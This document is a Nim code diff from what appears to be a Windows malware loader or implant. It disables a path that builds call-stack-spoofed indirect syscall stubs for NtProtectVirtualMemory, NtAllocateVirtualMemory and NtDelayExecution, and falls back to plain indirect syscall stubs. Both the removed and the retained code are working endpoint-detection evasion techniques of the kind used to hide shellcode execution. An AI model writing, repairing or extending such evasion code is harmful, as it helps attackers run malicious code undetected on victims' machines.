@@ -229,21 +229,10 @@ proc initSyscalls*() =
   let syscallGadget = findSyscallGadget(base)
   let spoofGadget   = findSpoofGadget(base)
 
-  if syscallGadget != 0 and spoofGadget != 0:
-    # Phase 10 path: allocate separate page for 110-byte spoofed stubs.
-    spoofPage = VirtualAlloc(nil, 4096, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
-    if spoofPage != nil:
-      stubProtectVM = cast[NtProtectVirtualMemory_t](
-          makeSpoofedStub(ssnPvm, syscallGadget, spoofGadget))
-      stubAllocVM   = cast[NtAllocateVirtualMemory_t](
-          makeSpoofedStub(ssnAvm, syscallGadget, spoofGadget))
-      stubDelayExec = cast[NtDelayExecution_t](
-          makeSpoofedStub(ssnDe,  syscallGadget, spoofGadget))
-      # Mark spoofPage execute-read; no longer writable after stubs are written.
-      var old: DWORD
-      discard VirtualProtect(spoofPage, 4096, PAGE_EXECUTE_READ, addr old)
-      return
-    # VirtualAlloc failed — fall through to Phase 4
+  # Phase 10 (spoofed stubs) disabled: the arg-sliding corrupts the caller's
+  # stack frame. Use Phase 4 (plain 11-byte indirect stubs) which correctly
+  # preserves the calling convention without any stack manipulation.
+  discard syscallGadget; discard spoofGadget
 
   # Phase 4 fallback: plain 11-byte indirect stubs on stubPage.
   stubProtectVM  = cast[NtProtectVirtualMemory_t](makeStub(ssnPvm))
